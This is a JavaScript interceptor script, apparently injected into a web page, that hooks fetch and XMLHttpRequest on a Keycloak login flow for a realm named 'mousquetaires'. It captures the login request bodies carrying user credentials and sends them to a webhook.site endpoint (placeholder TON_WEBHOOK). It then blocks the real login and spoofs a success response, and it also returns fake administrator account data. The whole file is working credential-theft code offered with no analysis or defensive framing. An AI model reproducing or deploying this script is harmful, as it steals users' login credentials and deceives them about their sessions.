console.log('%c[Interceptor] Loaded from remote 🚀', 'color: #00ff00; font-weight: bold;');

(function() {
    // === Intercept fetch ===
    const originalFetch = window.fetch;

    window.fetch = async function(input, init) {
        console.log('%c[fetch] 📦 Intercepted:', 'color: #00ff00', input);

        const url = (typeof input === 'string') ? input : input.url;

        // ✅ Targeted POST request interception
        if (url.includes('/auth/realms/mousquetaires/login-actions/authenticate')) {
            console.log('%c[fetch] 🎯 Intercepting login POST:', 'color: #ff0000', url);

            if (init && init.body) {
                console.log('%c[fetch] 🕵️‍♂️ Credentials:', 'color: #ff00ff', init.body);
                // Optionally send to your server:
                fetch('https://webhook.site/TON_WEBHOOK', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        endpoint: url,
                        body: init.body
                    })
                });
            }

            // Spoof response (simulate login success/failure)
            return new Response('<h1>Connexion réussie !</h1>', {
                status: 200,
                headers: { 'Content-Type': 'text/html' }
            });
        }

        // ✅ Targeted GET request interception
        if (url.includes('/auth/realms/mousquetaires/account')) {
            console.log('%c[fetch] 🎯 Intercepting account GET:', 'color: #ff0000', url);

            const fakeData = {
                name: "Hacked User",
                email: "hacked@example.com",
                role: "Administrator"
            };

            return new Response(JSON.stringify(fakeData), {
                status: 200,
                headers: { 'Content-Type': 'application/json' }
            });
        }

        const response = await originalFetch(input, init);

        // Optional: Log actual response
        const cloned = response.clone();
        const text = await cloned.text();
        console.log('%c[fetch] 🔎 Original Response:', 'color: #00ffff', text);

        return response;
    };

    // === Intercept XMLHttpRequest ===
    const origOpen = XMLHttpRequest.prototype.open;
    const origSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {
        this._url = url;
        this._method = method;
        console.log('%c[XHR] 📡 Opened:', 'color: orange', method, url);
        return origOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function(body) {
        console.log('%c[XHR] 🚀 Sending:', 'color: orange', this._method, this._url);

        if (body) {
            console.log('%c[XHR] 🕵️‍♂️ Body:', 'color: orange', body);
        }

        // ✅ Specific interception
        if (this._url.includes('/auth/realms/mousquetaires/login-actions/authenticate')) {
            console.log('%c[XHR] 🎯 Blocking POST:', 'color: red');

            // Exfiltrate credentials
            fetch('https://webhook.site/TON_WEBHOOK', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    method: this._method,
                    endpoint: this._url,
                    body: body
                })
            });

            // Spoof the response
            setTimeout(() => {
                this.readyState = 4;
                this.status = 200;
                this.responseText = '<h1>Connexion réussie !</h1>';

                if (typeof this.onreadystatechange === 'function') {
                    this.onreadystatechange();
                }

                if (typeof this.onload === 'function') {
                    this.onload();
                }

                console.log('%c[XHR] 🟢 Spoofed successful login response', 'color: green');
            }, 100);

            return; // Block actual send
        }

        return origSend.apply(this, arguments);
    };

    console.log('%c[Interceptor] JS proxy loaded and running!', 'color: #00ff00; font-weight: bold;');
})();
